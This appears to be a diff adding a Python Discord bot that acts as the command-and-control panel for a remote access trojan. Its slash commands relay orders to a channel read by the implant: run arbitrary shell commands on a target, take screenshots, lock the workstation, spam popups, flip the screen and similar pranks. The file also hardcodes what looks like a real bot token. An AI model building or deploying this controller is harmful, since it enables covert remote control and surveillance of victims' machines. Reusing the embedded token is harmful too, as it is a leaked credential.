@@ -1,0 +1,81 @@
+# language: Python, file: ratbot.py, runtime: py3.10+, deps: discord.py
+# install: pip install discord.py
+import discord
+from discord import app_commands
+
+TOKEN = "MTU1NzgzNzgxNTYyOTQ4ODI4OA.GkQAaq._agx7gnLEuJ5fbgSbLixqo1rr5V2b1RVEEUfTk"
+CHANNEL_ID = 1234567890123456789  # right-click the webhook channel -> Copy Channel ID
+
+intents = discord.Intents.default()
+intents.message_content = True
+client = discord.Client(intents=intents)
+tree = app_commands.CommandTree(client)
+
+@client.event
+async def on_ready():
+    await tree.sync()
+    print(f"bot online as {client.user}")
+
+@tree.command(name="ping", description="health check")
+async def _ping(i: discord.Interaction):
+    await _relay(i, "ping")
+
+@tree.command(name="flip", description="flip target screen")
+async def _flip(i: discord.Interaction):
+    await _relay(i, "flip")
+
+@tree.command(name="swap", description="swap mouse buttons")
+async def _swap(i: discord.Interaction):
+    await _relay(i, "swap")
+
+@tree.command(name="spam", description="popup spam")
+async def _spam(i: discord.Interaction):
+    await _relay(i, "spam")
+
+@tree.command(name="rick", description="rickroll")
+async def _rick(i: discord.Interaction):
+    await _relay(i, "rick")
+
+@tree.command(name="speak", description="make target speak")
+async def _speak(i: discord.Interaction):
+    await _relay(i, "speak")
+
+@tree.command(name="screenshot", description="capture target screen")
+async def _ss(i: discord.Interaction):
+    await _relay(i, "screenshot")
+
+@tree.command(name="lock", description="lock target workstation")
+async def _lock(i: discord.Interaction):
+    await _relay(i, "lock")
+
+@tree.command(name="cd", description="eject cd tray")
+async def _cd(i: discord.Interaction):
+    await _relay(i, "cd")
+
+@tree.command(name="shake", description="shake cursor")
+async def _shake(i: discord.Interaction):
+    await _relay(i, "shake")
+
+@tree.command(name="shell", description="run shell command on target")
+@app_commands.describe(cmd="command to run")
+async def _shell(i: discord.Interaction, cmd: str):
+    await _relay(i, f"shell {cmd}")
+
+@tree.command(name="msg", description="popup message on target")
+@app_commands.describe(text="popup text")
+async def _msg(i: discord.Interaction, text: str):
+    await _relay(i, f"msg {text}")
+
+@tree.command(name="uninstall", description="remove rat from target")
+async def _uninstall(i: discord.Interaction):
+    await _relay(i, "uninstall")
+
+async def _relay(i: discord.Interaction, payload: str):
+    ch = client.get_channel(CHANNEL_ID)
+    if ch is None:
+        await i.response.send_message("channel not found", ephemeral=True)
+        return
+    await ch.send(payload)  # rat reads this plain message
+    await i.response.send_message(f"sent: `{payload}`", ephemeral=True)
+
+client.run(TOKEN)
